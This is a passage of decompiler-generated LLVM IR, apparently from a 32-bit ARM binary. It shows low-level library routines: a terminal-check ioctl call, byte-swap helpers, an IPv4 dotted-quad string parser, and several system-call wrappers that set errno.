  %v0_f7d8 = call i32 @function_f2e0()
  %v1_f7dc = add i32 %v0_f7d8, 1
  store i32 %v1_f7dc, i32* @r4, align 4
  %v1_f7e4 = call i32 @function_fd60(i32 %v1_f7dc)
  store i32 %v1_f7e4, i32* %r5.global-to-local, align 4
  %v2_f7e8 = icmp eq i32 %v1_f7e4, 0
  br i1 %v2_f7e8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f7d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f7d0, %bb
  %v1_f7f4 = xor i1 %v2_f7e8, true
  call void @__pseudo_cond_branch(i1 %v1_f7f4, i32 ptrtoint (i32* @global_var_f350.391 to i32))
  %v0_f7f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_f7fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f7fc, i32* @r4, align 4
  store i32 %v9_f7d0, i32* @r6, align 4
  ret i32 %v0_f7f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f804(i32 %arg1) local_unnamed_addr {
dec_label_pc_f804:
  %stack_var_-68 = alloca i32, align 4
  %v2_f80c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f80c, i32* @r1, align 4
  %v0_f810 = call i32 @function_f828()
  %v1_f814 = sub i32 1, %v0_f810
  %v2_f814 = icmp ult i32 %v0_f810, 2
  br i1 %v2_f814, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_f804
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_f804, %bb
  %v1_f824 = phi i32 [ %v1_f814, %dec_label_pc_f804 ], [ 0, %bb ]
  ret i32 %v1_f824

; uselistorder directives
  uselistorder i32 %v0_f810, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_f828() local_unnamed_addr {
dec_label_pc_f828:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_f828 = load i32, i32* @r4, align 4
  %v6_f828 = load i32, i32* @r5, align 4
  %v2_f830 = ptrtoint i32* %stack_var_-52 to i32
  %v0_f834 = load i32, i32* @r1, align 4
  store i32 %v0_f834, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_f840 = load i32, i32* @r0, align 4
  %v3_f840 = call i32 @function_cd50(i32 %v0_f840, i32 21505, i32 %v2_f830)
  store i32 %v3_f840, i32* %r0.global-to-local, align 4
  store i32 %v3_f840, i32* @r5, align 4
  %v2_f844 = icmp eq i32 %v3_f840, 0
  br i1 %v2_f844, label %dec_label_pc_f84c, label %dec_label_pc_f890

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f828
  %v4_f858 = zext i8 %tmp to i32
  store i32 %v4_f858, i32* @ip, align 4
  %v3_f85c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f85c, i32* @r3, align 4
  %v1_f860 = load i32, i32* @r4, align 4
  %v2_f860 = add i32 %v1_f860, 4
  %v3_f860 = inttoptr i32 %v2_f860 to i32*
  %v0_f864 = load i32, i32* %r1.global-to-local, align 4
  %v1_f864 = load i32, i32* @r4, align 4
  %v2_f864 = add i32 %v1_f864, 8
  %v3_f864 = inttoptr i32 %v2_f864 to i32*
  store i32 %v0_f864, i32* %v3_f864, align 4
  %v0_f868 = load i32, i32* %r0.global-to-local, align 4
  %v1_f868 = load i32, i32* @r4, align 4
  %v2_f868 = add i32 %v1_f868, 12
  %v3_f868 = inttoptr i32 %v2_f868 to i32*
  store i32 %v0_f868, i32* %v3_f868, align 4
  %v2_f86c = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_f86c, i32* @r1, align 4
  %v1_f874 = load i32, i32* @r4, align 4
  %v2_f874 = inttoptr i32 %v1_f874 to i32*
  store i32 %v3_f85c, i32* %v2_f874, align 4
  %v0_f878 = load i32, i32* @ip, align 4
  %v1_f878 = trunc i32 %v0_f878 to i8
  %v2_f878 = load i32, i32* @r4, align 4
  %v3_f878 = add i32 %v2_f878, 16
  %v4_f878 = inttoptr i32 %v3_f878 to i8*
  store i8 %v1_f878, i8* %v4_f878, align 1
  %v0_f87c = load i32, i32* @r4, align 4
  %v1_f87c = add i32 %v0_f87c, 17
  store i32 %v1_f87c, i32* %r0.global-to-local, align 4
  %v4_f880 = call i32 @function_14808(i32 %v1_f87c, i32 %v2_f86c, i32 19, i32 %v3_f85c)
  store i32 %v4_f880, i32* %r0.global-to-local, align 4
  %v0_f884 = load i32, i32* @r5, align 4
  store i32 %v0_f884, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_f88c = inttoptr i32 %v4_f880 to i8*
  %v3_f88c = call i32 @function_f240(i8* %v2_f88c, i32 %v0_f884)
  store i32 %v3_f88c, i32* %r0.global-to-local, align 4
  %v0_f890.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f890

dec_label_pc_f890:                                ; preds = %dec_label_pc_f828, %dec_label_pc_f84c
  %v0_f890 = phi i32 [ %v3_f840, %dec_label_pc_f828 ], [ %v0_f890.pre, %dec_label_pc_f84c ]
  store i32 %v0_f890, i32* %r0.global-to-local, align 4
  store i32 %v3_f828, i32* @r4, align 4
  store i32 %v6_f828, i32* @r5, align 4
  ret i32 %v0_f890

; uselistorder directives
  uselistorder i32 %v0_f890, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32)* @function_cd50, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f890, { 1, 0 }
}

define i32 @function_f8a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f8a4:
  %v3_f8a4 = udiv i32 %arg1, 256
  %v1_f8a8 = mul i32 %arg1, 256
  %v4_f8ac = and i32 %v1_f8a8, 65280
  %v5_f8ac = or i32 %v4_f8ac, %v3_f8a4
  ret i32 %v5_f8ac
}

define i32 @function_f8b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f8b4:
  %v5_f8cc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_f8cc
}

define i32 @function_f8d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f8d4:
  %v3_f8d4 = udiv i32 %arg1, 256
  %v1_f8d8 = mul i32 %arg1, 256
  %v4_f8dc = and i32 %v1_f8d8, 65280
  %v5_f8dc = or i32 %v4_f8dc, %v3_f8d4
  ret i32 %v5_f8dc
}

define i32 @function_f8e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f8e4:
  %v5_f8fc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_f8fc
}

define i32 @function_f904(i32 %arg1) local_unnamed_addr {
dec_label_pc_f904:
  %v0_f930.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %dec_label_pc_fa24, %dec_label_pc_f904
  %v1_fa08 = phi i32 [ %v2_fa10, %dec_label_pc_fa24 ], [ 0, %dec_label_pc_f904 ]
  %v0_fa18 = phi i32 [ %v1_fa18, %dec_label_pc_fa24 ], [ 0, %dec_label_pc_f904 ]
  %v0_f944 = phi i32 [ %v1_fa24, %dec_label_pc_fa24 ], [ %v0_f930.pre, %dec_label_pc_f904 ]
  %v1_f930 = inttoptr i32 %v0_f944 to i8*
  %v2_f930 = load i8, i8* %v1_f930, align 1
  %v7_f934 = icmp eq i8 %v2_f930, 48
  br i1 %v7_f934, label %dec_label_pc_f944, label %.thread

.thread:                                          ; preds = %dec_label_pc_f930
  br label %.thread9

dec_label_pc_f944:                                ; preds = %dec_label_pc_f930
  %v1_f944 = add i32 %v0_f944, 1
  %v2_f944 = inttoptr i32 %v1_f944 to i8*
  %v3_f944 = load i8, i8* %v2_f944, align 1
  %v7_f948 = icmp eq i8 %v3_f944, 88
  br i1 %v7_f948, label %bb80, label %bb

bb:                                               ; preds = %dec_label_pc_f944
  %v8_f94c = icmp eq i8 %v3_f944, 120
  br i1 %v8_f94c, label %bb80, label %.thread3

.thread3:                                         ; preds = %bb
  br label %.thread9

bb80:                                             ; preds = %dec_label_pc_f944, %bb
  %v2_f958 = add i32 %v0_f944, 2
  br label %.thread9

.thread9:                                         ; preds = %.thread3, %.thread, %bb80
  %v0_f9e822 = phi i32 [ %v1_f944, %.thread3 ], [ %v0_f944, %.thread ], [ %v2_f958, %bb80 ]
  %v0_f9fc95 = phi i32 [ 1, %.thread3 ], [ 0, %.thread ], [ 0, %bb80 ]
  %v0_f9b448 = phi i32 [ 8, %.thread3 ], [ 10, %.thread ], [ 16, %bb80 ]
  %v1_f9e823 = inttoptr i32 %v0_f9e822 to i8*
  %v2_f9e824 = load i8, i8* %v1_f9e823, align 1
  %v3_f9e825 = zext i8 %v2_f9e824 to i32
  %v2_f9f027 = icmp eq i8 %v2_f9e824, 0
  br i1 %v2_f9f027, label %dec_label_pc_f9fc, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %.thread9, %dec_label_pc_f9e0
  %v0_f9fc92 = phi i32 [ 1, %dec_label_pc_f9e0 ], [ %v0_f9fc95, %.thread9 ]
  %v0_f9e0 = phi i32 [ %v1_f9e0, %dec_label_pc_f9e0 ], [ %v0_f9e822, %.thread9 ]
  %v1_f9d0 = phi i32 [ %storemerge, %dec_label_pc_f9e0 ], [ 0, %.thread9 ]
  %v1_f9ac = phi i32 [ %v3_f9e8, %dec_label_pc_f9e0 ], [ %v3_f9e825, %.thread9 ]
  %v2_f9ec28.in = phi i32 [ %v3_f9e8, %dec_label_pc_f9e0 ], [ %v3_f9e825, %.thread9 ]
  %v0_f9a4 = phi i32 [ %v0_f9b450, %dec_label_pc_f9e0 ], [ %v0_f9b448, %.thread9 ]
  %v2_f9ec28 = mul nuw nsw i32 %v2_f9ec28.in, 2
  %v4_f974 = load i32, i32* inttoptr (i32 142964 to i32*), align 4
  %v2_f978 = add i32 %v4_f974, %v2_f9ec28
  %v3_f978 = inttoptr i32 %v2_f978 to i16*
  %v4_f978 = load i16, i16* %v3_f978, align 2
  %v6_f978 = zext i16 %v4_f978 to i32
  %v1_f97c = and i32 %v6_f978, 8
  %v2_f97c = icmp eq i32 %v1_f97c, 0
  br i1 %v2_f97c, label %dec_label_pc_f9b4, label %dec_label_pc_f988

dec_label_pc_f988:                                ; preds = %dec_label_pc_f96c
  %tmp = icmp ult i32 %v1_f9ac, 56
  br i1 %tmp, label %.thread11, label %bb83

.thread11:                                        ; preds = %dec_label_pc_f988
  br label %dec_label_pc_f9a4

bb83:                                             ; preds = %dec_label_pc_f988
  %v7_f988 = icmp eq i32 %v0_f9a4, 8
  %v2_f99c = icmp eq i1 %v7_f988, false
  br i1 %v2_f99c, label %dec_label_pc_f9a4, label %dec_label_pc_fa34

dec_label_pc_f9a4:                                ; preds = %.thread11, %bb83
  %v2_f9a4 = mul i32 %v0_f9a4, %v1_f9d0
  %v1_f9a8 = add i32 %v2_f9a4, -48
  %v2_f9ac = add i32 %v1_f9a8, %v1_f9ac
  br label %dec_label_pc_f9d8

dec_label_pc_f9b4:                                ; preds = %dec_label_pc_f96c
  %v7_f9b4 = icmp eq i32 %v0_f9a4, 16
  br i1 %v7_f9b4, label %dec_label_pc_f9bc, label %dec_label_pc_f9fc

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_f9b4
  %v1_f9bc = and i32 %v6_f978, 16
  %v2_f9bc = icmp eq i32 %v1_f9bc, 0
  br i1 %v2_f9bc, label %dec_label_pc_f9fc, label %dec_label_pc_f9c4

dec_label_pc_f9c4:                                ; preds = %dec_label_pc_f9bc
  %v1_f9c4 = and i32 %v6_f978, 2
  %tmp100 = mul nuw nsw i32 %v1_f9c4, 16
  %tmp101 = or i32 %tmp100, 65
  %v4_f9d0 = mul i32 %v1_f9d0, 16
  %v5_f9d0 = sub i32 %v4_f9d0, %tmp101
  %v1_f9d4 = add i32 %v5_f9d0, 10
  br label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f9a4, %dec_label_pc_f9c4
  %v0_f9b450 = phi i32 [ %v0_f9a4, %dec_label_pc_f9a4 ], [ 16, %dec_label_pc_f9c4 ]
  %storemerge = phi i32 [ %v2_f9ac, %dec_label_pc_f9a4 ], [ %v1_f9d4, %dec_label_pc_f9c4 ]
  %tmp102 = icmp ugt i32 %storemerge, 255
  br i1 %tmp102, label %dec_label_pc_fa34, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9d8
  %v1_f9e0 = add i32 %v0_f9e0, 1
  %v1_f9e8 = inttoptr i32 %v1_f9e0 to i8*
  %v2_f9e8 = load i8, i8* %v1_f9e8, align 1
  %v3_f9e8 = zext i8 %v2_f9e8 to i32
  %v2_f9f0 = icmp eq i8 %v2_f9e8, 0
  br i1 %v2_f9f0, label %dec_label_pc_f9fc.thread, label %dec_label_pc_f96c

dec_label_pc_f9fc.thread:                         ; preds = %dec_label_pc_f9e0
  br label %dec_label_pc_fa04

dec_label_pc_f9fc:                                ; preds = %dec_label_pc_f9bc, %dec_label_pc_f9b4, %.thread9
  %v0_f9fc = phi i32 [ %v0_f9fc95, %.thread9 ], [ %v0_f9fc92, %dec_label_pc_f9bc ], [ %v0_f9fc92, %dec_label_pc_f9b4 ]
  %v0_fa24 = phi i32 [ %v0_f9e822, %.thread9 ], [ %v0_f9e0, %dec_label_pc_f9bc ], [ %v0_f9e0, %dec_label_pc_f9b4 ]
  %v1_fa10 = phi i32 [ 0, %.thread9 ], [ %v1_f9d0, %dec_label_pc_f9bc ], [ %v1_f9d0, %dec_label_pc_f9b4 ]
  %v0_fa2c = phi i32 [ %v3_f9e825, %.thread9 ], [ %v1_f9ac, %dec_label_pc_f9bc ], [ %v1_f9ac, %dec_label_pc_f9b4 ]
  %v2_f9fc = icmp eq i32 %v0_f9fc, 0
  br i1 %v2_f9fc, label %dec_label_pc_fa34, label %dec_label_pc_fa04

dec_label_pc_fa04:                                ; preds = %dec_label_pc_f9fc.thread, %dec_label_pc_f9fc
  %v0_fa2c99 = phi i32 [ %v3_f9e8, %dec_label_pc_f9fc.thread ], [ %v0_fa2c, %dec_label_pc_f9fc ]
  %v1_fa1098 = phi i32 [ %storemerge, %dec_label_pc_f9fc.thread ], [ %v1_fa10, %dec_label_pc_f9fc ]
  %v0_fa2497 = phi i32 [ %v1_f9e0, %dec_label_pc_f9fc.thread ], [ %v0_fa24, %dec_label_pc_f9fc ]
  %v2_fa04 = icmp eq i32 %v0_fa18, 0
  br i1 %v2_fa04, label %bb87, label %bb86

bb86:                                             ; preds = %dec_label_pc_fa04
  %v4_fa08 = mul i32 %v1_fa08, 256
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_fa04, %bb86
  %v0_fa10 = phi i32 [ %v1_fa08, %dec_label_pc_fa04 ], [ %v4_fa08, %bb86 ]
  %v7_fa0c = icmp eq i32 %v0_fa2c99, 46
  %v2_fa10 = or i32 %v0_fa10, %v1_fa1098
  br i1 %v7_fa0c, label %dec_label_pc_fa18, label %dec_label_pc_fa2c

dec_label_pc_fa18:                                ; preds = %bb87
  %v1_fa18 = add i32 %v0_fa18, 1
  %v7_fa1c = icmp eq i32 %v1_fa18, 4
  br i1 %v7_fa1c, label %dec_label_pc_fa34, label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %dec_label_pc_fa18
  %v1_fa24 = add i32 %v0_fa2497, 1
  br label %dec_label_pc_f930

dec_label_pc_fa2c:                                ; preds = %bb87
  %v2_fa2c = icmp eq i32 %v0_fa2c99, 0
  br i1 %v2_fa2c, label %dec_label_pc_fa38, label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa18, %dec_label_pc_f9fc, %bb83, %dec_label_pc_f9d8, %dec_label_pc_fa2c
  br label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa2c, %dec_label_pc_fa34
  %v0_fa38 = phi i32 [ %v2_fa10, %dec_label_pc_fa2c ], [ -1, %dec_label_pc_fa34 ]
  ret i32 %v0_fa38

; uselistorder directives
  uselistorder i32 %v1_fa18, { 1, 0 }
  uselistorder i32 %v3_f9e8, { 1, 2, 0 }
  uselistorder i32 %v1_f9e0, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v0_f9a4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f9ac, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f9d0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_f9e825, { 2, 0, 1 }
  uselistorder i32 %v0_f9e822, { 1, 0, 2 }
  uselistorder i32 %v1_fa08, { 1, 0 }
  uselistorder label %dec_label_pc_fa38, { 1, 0 }
  uselistorder label %dec_label_pc_fa34, { 4, 0, 1, 3, 2 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %dec_label_pc_fa04, { 1, 0 }
  uselistorder label %dec_label_pc_f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_f9a4, { 1, 0 }
  uselistorder label %dec_label_pc_f96c, { 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %bb80, { 1, 0 }
}

define i32 @function_fa48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fa48:
  %v0_fa48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fa48, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fa48
  %v1_fa48 = load i32, i32* @r8, align 4
  %v3_fa48 = mul i32 %v1_fa48, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fa48, %bb
  %.01 = phi i32 [ %v3_fa48, %bb ], [ undef, %dec_label_pc_fa48 ]
  ret i32 %.01

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_fa50(i32 %arg1) local_unnamed_addr {
dec_label_pc_fa50:
  %stack_var_-12 = alloca i32, align 4
  %v2_fa58 = ptrtoint i32* %stack_var_-12 to i32
  %v0_fa5c = load i32, i32* @r0, align 4
  %v2_fa5c = inttoptr i32 %v0_fa5c to i8*
  %v3_fa5c = call i32 @function_14a48(i8* %v2_fa5c, i32 %v2_fa58)
  %v2_fa60 = icmp eq i32 %v3_fa5c, 0
  %v4_fa64 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_fa60, i32 -1, i32 %v4_fa64
  ret i32 %storemerge
}

define i32 @function_fa78(i32 %arg1) local_unnamed_addr {
dec_label_pc_fa78:
  store i32 2, i32* @r1, align 4
  %v0_fa84 = call i32 @function_fa94()
  ret i32 %v0_fa84
}

define i32 @function_fa94() local_unnamed_addr {
dec_label_pc_fa94:
  %stack_var_-20 = alloca i32, align 4
  %v3_fa94 = load i32, i32* @r4, align 4
  %v6_fa94 = load i32, i32* @r5, align 4
  %v0_fa9c = load i32, i32* @r0, align 4
  store i32 %v0_fa9c, i32* @r4, align 4
  %v0_faa0 = load i32, i32* @r1, align 4
  store i32 %v0_faa0, i32* @r5, align 4
  %v0_faa4 = call i32 @function_12ba4()
  %v0_facc = load i32, i32* @r4, align 4
  %v2_fad0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_fad0, i32* @ip, align 4
  %v0_fad4 = load i32, i32* @r5, align 4
  %v8_fadc = call i32 @function_14b40(i32 %v0_facc, i32 %v0_fad4, i32* nonnull @global_var_254a4.399, i32 ptrtoint (i32* @global_var_252ec.398 to i32), i32 440, i32 %v2_fad0, i32 %v0_faa4)
  %v3_fae0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_fa94, i32* @r4, align 4
  store i32 %v6_fa94, i32* @r5, align 4
  ret i32 %v3_fae0
}

define i32 @function_faf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_faf4:
  %v0_faf4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_faf4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_faf4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_faf4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_fafc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_fafc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fafc = load i32, i32* @r7, align 4
  store i32 %v3_fafc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fb24, label %dec_label_pc_fb14

dec_label_pc_fb14:                                ; preds = %dec_label_pc_fafc
  %v0_fb14 = call i32 @function_ce08()
  %v0_fb18 = load i32, i32* %r7.global-to-local, align 4
  %v1_fb18 = sub i32 0, %v0_fb18
  %v2_fb1c = inttoptr i32 %v0_fb14 to i32*
  store i32 %v1_fb18, i32* %v2_fb1c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fb28.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb24

dec_label_pc_fb24:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_fb14
  %v2_fb28 = phi i32 [ %v3_fafc, %dec_label_pc_fafc ], [ %v2_fb28.pre, %dec_label_pc_fb14 ]
  %v0_fb24 = phi i32 [ %arg1, %dec_label_pc_fafc ], [ -1, %dec_label_pc_fb14 ]
  store i32 %v2_fb28, i32* @r7, align 4
  ret i32 %v0_fb24

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb24, { 1, 0 }
}

define i32 @function_fb34(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fb34:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb34 = load i32, i32* @r7, align 4
  store i32 %v3_fb34, i32* %stack_var_-8, align 4
  %v0_fb40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fb40, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fb40, -4095
  br i1 %tmp, label %dec_label_pc_fb60, label %dec_label_pc_fb50

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fb34
  %v0_fb50 = call i32 @function_ce08()
  %v0_fb54 = load i32, i32* %r7.global-to-local, align 4
  %v1_fb54 = sub i32 0, %v0_fb54
  %v2_fb58 = inttoptr i32 %v0_fb50 to i32*
  store i32 %v1_fb54, i32* %v2_fb58, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fb60.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb60

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fb34, %dec_label_pc_fb50
  %v1_fb64 = phi i32 [ %v0_fb40, %dec_label_pc_fb34 ], [ -1, %dec_label_pc_fb50 ]
  %v2_fb60 = phi i32 [ %v3_fb34, %dec_label_pc_fb34 ], [ %v2_fb60.pre, %dec_label_pc_fb50 ]
  store i32 %v2_fb60, i32* @r7, align 4
  ret i32 %v1_fb64

; uselistorder directives
  uselistorder i32 %v0_fb40, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb60, { 1, 0 }
}

define i32 @function_fb6c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fb6c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb6c = load i32, i32* @r7, align 4
  store i32 %v3_fb6c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fb94, label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fb6c
  %v0_fb84 = call i32 @function_ce08()
  %v0_fb88 = load i32, i32* %r7.global-to-local, align 4
  %v1_fb88 = sub i32 0, %v0_fb88
  %v2_fb8c = inttoptr i32 %v0_fb84 to i32*
  store i32 %v1_fb88, i32* %v2_fb8c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fb98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb6c, %dec_label_pc_fb84
  %v2_fb98 = phi i32 [ %v3_fb6c, %dec_label_pc_fb6c ], [ %v2_fb98.pre, %dec_label_pc_fb84 ]
  %v0_fb94 = phi i32 [ %arg1, %dec_label_pc_fb6c ], [ -1, %dec_label_pc_fb84 ]
  store i32 %v2_fb98, i32* @r7, align 4
  ret i32 %v0_fb94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb94, { 1, 0 }
}

define i32 @function_fba4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fba4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fba4 = load i32, i32* @r7, align 4
  store i32 %v3_fba4, i32* %stack_var_-8, align 4
  %v0_fbb0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fbb0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fbb0, -4095
  br i1 %tmp, label %dec_label_pc_fbd0, label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fba4
  %v0_fbc0 = call i32 @function_ce08()
  %v0_fbc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_fbc4 = sub i32 0, %v0_fbc4
  %v2_fbc8 = inttoptr i32 %v0_fbc0 to i32*
  store i32 %v1_fbc4, i32* %v2_fbc8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fbd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fba4, %dec_label_pc_fbc0
  %v1_fbd4 = phi i32 [ %v0_fbb0, %dec_label_pc_fba4 ], [ -1, %dec_label_pc_fbc0 ]
  %v2_fbd0 = phi i32 [ %v3_fba4, %dec_label_pc_fba4 ], [ %v2_fbd0.pre, %dec_label_pc_fbc0 ]
  store i32 %v2_fbd0, i32* @r7, align 4
  ret i32 %v1_fbd4

; uselistorder directives
  uselistorder i32 %v0_fbb0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fbd0, { 1, 0 }
}

define i32 @function_fbd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fbd8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fbd8 = load i32, i32* @r7, align 4
  store i32 %v3_fbd8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fc00, label %dec_label_pc_fbf0

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_fbd8
  %v0_fbf0 = call i32 @function_ce08()
  %v0_fbf4 = load i32, i32* %r7.global-to-local, align 4
  %v1_fbf4 = sub i32 0, %v0_fbf4
  %v2_fbf8 = inttoptr i32 %v0_fbf0 to i32*
  store i32 %v1_fbf4, i32* %v2_fbf8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fc04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fbd8, %dec_label_pc_fbf0
  %v2_fc04 = phi i32 [ %v3_fbd8, %dec_label_pc_fbd8 ], [ %v2_fc04.pre, %dec_label_pc_fbf0 ]
  %v0_fc00 = phi i32 [ %arg1, %dec_label_pc_fbd8 ], [ -1, %dec_label_pc_fbf0 ]
  store i32 %v2_fc04, i32* @r7, align 4
  ret i32 %v0_fc00

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc00, { 1, 0 }
}

define i32 @function_fc10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_fc10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fc10 = load i32, i32* @r4, align 4
  store i32 %v3_fc10, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fc40, label %dec_label_pc_fc30

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc10
  %v0_fc30 = call i32 @function_ce08()
  %v0_fc34 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc34 = sub i32 0, %v0_fc34
  %v2_fc38 = inttoptr i32 %v0_fc30 to i32*
  store i32 %v1_fc34, i32* %v2_fc38, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_fc44.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc10, %dec_label_pc_fc30
  %v2_fc44 = phi i32 [ %v3_fc10, %dec_label_pc_fc10 ], [ %v2_fc44.pre, %dec_label_pc_fc30 ]
  %v0_fc40 = phi i32 [ %arg1, %dec_label_pc_fc10 ], [ -1, %dec_label_pc_fc30 ]
